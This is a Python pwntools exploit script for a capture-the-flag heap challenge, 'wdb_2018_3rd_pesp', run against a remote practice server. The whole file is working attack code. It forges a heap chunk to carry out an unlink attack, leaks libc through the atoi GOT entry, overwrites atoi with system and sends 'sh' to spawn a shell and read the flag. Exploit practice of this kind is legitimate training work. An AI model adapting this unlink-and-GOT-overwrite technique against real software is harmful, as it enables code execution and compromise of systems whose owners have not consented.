# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './wdb_2018_3rd_pesp'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '29827'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('Your choice:',num)

def add(size , content = 'a'):
    cmd(2)
    sla('length of servant name:' , size)
    sa('name of servant:' , content)

def show():
    cmd(1)

def edit(idx , size , content = 'a'):
    cmd(3)
    sla('index of servant:' , idx)
    sla('length of servant name:' , size)
    sa('servnat:' , content)

def delete(idx):
    cmd(4)
    sla('index of servant:' , idx)

# one_gad = one_gadget(libc.path)

def attack():

    free_plt = elf.plt['free']
    atoi_got = elf.got['atoi']
    atoi_plt = elf.plt['atoi']
    ptr_list = 0x6020C8
    add(0x28)
    add(0xf8)
    fake_chunk = flat(
        0 , 0x20,
        0x6020C8 - 0x18 , 0x6020C8 - 0x10,
        0x20
    )
    edit(0 , 0x28 , fake_chunk )
    delete(1)
    fake_ptr = flat(
        0x8 , atoi_plt,
        0x8 , atoi_got,
    )

    edit( 0 , 0x28 ,  fake_ptr)
    show()
    leak = l64()
    libc.address = leak - libc.sym['atoi']
    system_addr = libc.sym['system']

    edit( 0 , 0x8 ,p64(system_addr))
    cmd('sh')

    # dbg()

    ''

attack()
p.success(getShell())
p.interactive()

'''
@File    :   wdb_2018_3rd_pesp.py
@Time    :   2021/10/29 14:44:34
@Author  :   Niyah 
'''